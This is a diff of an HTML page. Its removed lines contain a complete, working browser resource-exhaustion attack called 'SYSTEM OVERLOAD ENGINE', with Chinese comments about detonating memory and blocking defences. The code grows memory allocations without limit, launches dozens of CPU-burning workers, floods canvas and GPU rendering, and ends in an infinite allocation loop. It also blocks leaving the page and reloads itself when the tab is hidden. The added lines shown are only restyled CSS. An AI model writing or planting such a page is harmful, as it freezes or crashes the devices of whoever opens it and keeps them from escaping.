@@ -2,197 +2,40 @@
 <html>
 <head>
     <style>
-        :root { --red: #ff2222; --blue: #22ffff; }
-        body { 
-            margin: 0; 
-            background: #000; 
-            color: var(--blue);
+        :root {
+            --red: #ff4444;
+            --cyan: #00cccc;
+        }
+        body {
+            margin: 0;
+            background: #000;
+            color: var(--cyan);
             font-family: monospace;
             overflow: hidden;
         }
-        #overlay {
-            position: fixed;
-            top: 0;
-            left: 0;
-            width: 100%;
+        #terminal {
             padding: 20px;
-            z-index: 1000;
+            height: 100vh;
+            box-sizing: border-box;
+            display: flex;
+            flex-direction: column;
         }
-        .progress {
+        #progress-container {
+            width: 90%;
             height: 20px;
-            background: #002;
+            background: #002b2b;
             margin: 10px 0;
-            border: 1px solid var(--blue);
         }
-        .progress-fill {
+        #progress-bar {
             height: 100%;
-            background: linear-gradient(90deg, var(--blue), var(--red));
+            background: linear-gradient(90deg, var(--cyan), var(--red));
             width: 0%;
-            transition: width 0.3s;
+            transition: width 0.5s ease;
         }
-        #status {
-            white-space: pre;
-            border-top: 1px solid #224;
+        #log-container {
+            flex: 1;
+            overflow-y: auto;
+            border-top: 1px solid #004d4d;
             padding-top: 10px;
         }
-    </style>
-</head>
-<body>
-    <div id="overlay">
-        <h1>[[ SYSTEM OVERLOAD ENGINE v3.14 ]]</h1>
-        <div class="progress"><div class="progress-fill" id="progress"></div></div>
-        <div id="status">初始化核心组件...</div>
-    </div>
-
-<script>
-(() => {
-    const BOMB_PROFILE = {
-        memory: {
-            unit: 256 * 1024 * 1024, // 256MB chunks
-            growth: 1.618, // 黄金比例增长
-            maxRetry: 100
-        },
-        compute: {
-            workerScript: `
-                const sab = new SharedArrayBuffer(1024);
-                const ia = new Int32Array(sab);
-                while(1) {
-                    Atomics.wait(ia, 0, 0, 10);
-                    for(let i=0;i<1e6;i++) Math.hypot(Math.random(), Math.random());
-                }
-            `,
-            workerCount: Math.max(16, navigator.hardwareConcurrency * 8)
-        },
-        render: {
-            canvasSize: 8192,
-            particleCount: 50000
-        }
-    };
-
-    let progress = 0;
-    let memoryAllocated = 0;
-    const statusEl = document.getElementById('status');
-    const progressEl = document.getElementById('progress');
-
-    // 原子内存攻击
-    const sab = new SharedArrayBuffer(1024);
-    const ia = new Int32Array(sab);
-    
-    // 内存核爆破
-    function detonateMemory() {
-        let chunkSize = BOMB_PROFILE.memory.unit;
-        let retryCount = 0;
-
-        const alloc = () => {
-            try {
-                const chunk = new ArrayBuffer(chunkSize);
-                memoryAllocated += chunkSize;
-                chunkSize *= BOMB_PROFILE.memory.growth;
-                retryCount = 0;
-                updateStatus(`内存分配: ${(memoryAllocated/1e9).toFixed(2)}GB`);
-            } catch(e) {
-                chunkSize = Math.max(1e6, chunkSize / 2);
-                if(retryCount++ > BOMB_PROFILE.memory.maxRetry) return;
-            }
-            requestAnimationFrame(alloc);
-        };
-        alloc();
-    }
-
-    // 计算核过载
-    function overloadCompute() {
-        for(let i=0; i<BOMB_PROFILE.compute.workerCount; i++) {
-            const worker = new Worker(
-                URL.createObjectURL(new Blob([BOMB_PROFILE.compute.workerScript]))
-            );
-            worker.postMessage(sab);
-        }
-        updateStatus(`启动 ${BOMB_PROFILE.compute.workerCount} 个计算线程`);
-    }
-
-    // 渲染引擎爆破
-    function destroyRendering() {
-        const canvas = document.createElement('canvas');
-        canvas.width = canvas.height = BOMB_PROFILE.render.canvasSize;
-        document.body.appendChild(canvas);
-        const ctx = canvas.getContext('2d');
-        const particles = new Array(BOMB_PROFILE.render.particleCount).fill().map(() => ({
-            x: Math.random() * canvas.width,
-            y: Math.random() * canvas.height,
-            vx: (Math.random() - 0.5) * 10,
-            vy: (Math.random() - 0.5) * 10
-        }));
-
-        function render() {
-            ctx.fillStyle = 'rgba(0,0,0,0.1)';
-            ctx.fillRect(0, 0, canvas.width, canvas.height);
-            
-            ctx.fillStyle = '#f00';
-            particles.forEach(p => {
-                p.x += p.vx;
-                p.y += p.vy;
-                if(p.x < 0 || p.x > canvas.width) p.vx *= -1;
-                if(p.y < 0 || p.y > canvas.height) p.vy *= -1;
-                ctx.beginPath();
-                ctx.arc(p.x, p.y, 2, 0, Math.PI*2);
-                ctx.fill();
-            });
-            
-            requestAnimationFrame(render);
-        }
-        render();
-        updateStatus(`渲染压力: ${BOMB_PROFILE.render.particleCount} 粒子@${BOMB_PROFILE.render.canvasSize}px`);
-    }
-
-    // 进度控制系统
-    function updateProgress() {
-        const memLoad = memoryAllocated / (4 * 1e9); // 4GB基准
-        const computeLoad = BOMB_PROFILE.compute.workerCount / 32;
-        progress = Math.min(100, (memLoad + computeLoad) * 50);
-        progressEl.style.width = progress + '%';
-        if(progress >= 100) {
-            statusEl.textContent += '\n[!] 系统临界状态 - 终局协议激活';
-            launchFinalBlitz();
-        }
-        requestAnimationFrame(updateProgress);
-    }
-
-    // 终局爆破协议
-    function launchFinalBlitz() {
-        // GPU纹理轰炸
-        const gl = document.createElement('canvas').getContext('webgl2');
-        const texture = gl.createTexture();
-        gl.bindTexture(gl.TEXTURE_2D, texture);
-        const pixels = new Uint8Array(4096*4096*4);
         
-        setInterval(() => {
-            gl.texImage2D(
-                gl.TEXTURE_2D, 0, gl.RGBA, 4096, 4096, 0, 
-                gl.RGBA, gl.UNSIGNED_BYTE, pixels
-            );
-        }, 16);
-
-        // 内存终局冲击
-        const terminalBomb = [];
-        while(true) {
-            terminalBomb.push(new Float64Array(1024*1024));
-        }
-    }
-
-    function updateStatus(msg) {
-        statusEl.textContent += `\n[${new Date().toLocaleTimeString()}] ${msg}`;
-    }
-
-    // 启动序列
-    detonateMemory();
-    overloadCompute();
-    destroyRendering();
-    updateProgress();
-
-    // 阻止防御机制
-    window.onbeforeunload = e => (e.preventDefault(), e.returnValue = '');
-    document.addEventListener('visibilitychange', () => location.reload());
-})();
-</script>
-</body>
-</html>
